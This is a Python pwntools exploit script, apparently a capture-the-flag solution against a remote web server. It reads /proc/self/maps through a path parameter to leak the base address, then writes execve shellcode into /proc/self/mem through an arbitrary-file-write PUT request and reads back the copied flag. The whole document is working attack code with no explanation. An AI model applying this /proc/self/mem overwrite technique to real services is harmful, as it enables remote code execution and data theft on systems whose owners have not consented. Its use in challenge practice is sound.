from pwn import *
import time

# Configuration
context.log_level = 'info'
HOST = 'challenges.1pc.tf'
PORT = 31073

# Load local binary to calculate offsets
try:
    elf = ELF('./server')
except:
    log.error("File 'server' not found!")
    exit(1)

def exploit():
    p = remote(HOST, PORT)

    # 1. Leak Base Address from /proc/self/maps
    log.info("Leaking memory map from /proc/self/maps...")
    p.send(b"GET /?path=/proc/self/maps HTTP/1.1\r\nConnection: keep-alive\r\n\r\n")

    maps_data = p.recvuntil(b"/app/server")
    lines = maps_data.split(b'\n')
    base_addr = 0
    for line in lines:
        if b"/app/server" in line:
            base_addr = int(line.split(b'-')[0], 16)
            break
            
    log.success(f"Base Address: {hex(base_addr)}")

    # 2. Calculate absolute address of 'send_response'
    target_sym = [s for s in elf.symbols.keys() if 'send_response' in s][0]
    target_offset = elf.symbols[target_sym]
    target_addr = base_addr + target_offset
    log.info(f"Target address (send_response): {hex(target_addr)}")

    # 3. Create Shellcode to copy the flag
    context.arch = 'amd64'
    cmd = "cat /flag* > /tmp/f.txt"
    shellcode = asm(shellcraft.amd64.linux.execve('/bin/sh', ['sh', '-c', cmd], 0))

    # 4. Overwrite memory via Arbitrary File Write to /proc/self/mem
    log.info("Overwriting memory and executing shellcode...")
    req = f"PUT /?path=/proc/self/mem&offset={target_addr} HTTP/1.1\r\n"
    req += f"Content-Length: {len(shellcode)}\r\n"
    req += "Connection: keep-alive\r\n\r\n"
    
    p.send(req.encode() + shellcode)
    time.sleep(1)
    p.close()

    # 5. Read the copied flag
    log.info("Reading flag from /tmp/f.txt...")
    p2 = remote(HOST, PORT)
    p2.send(b"GET /?path=/tmp/f.txt HTTP/1.1\r\nConnection: close\r\n\r\n")
    
    res = p2.recvall().decode(errors='ignore')
    if "C2C{" in res or "GZCTF{" in res:
        flag = res[res.find('\r\n\r\n')+4:].strip()
        log.success(f"FLAG CAPTURED: {flag}")
    else:
        print(res)

if __name__ == '__main__':
    exploit()
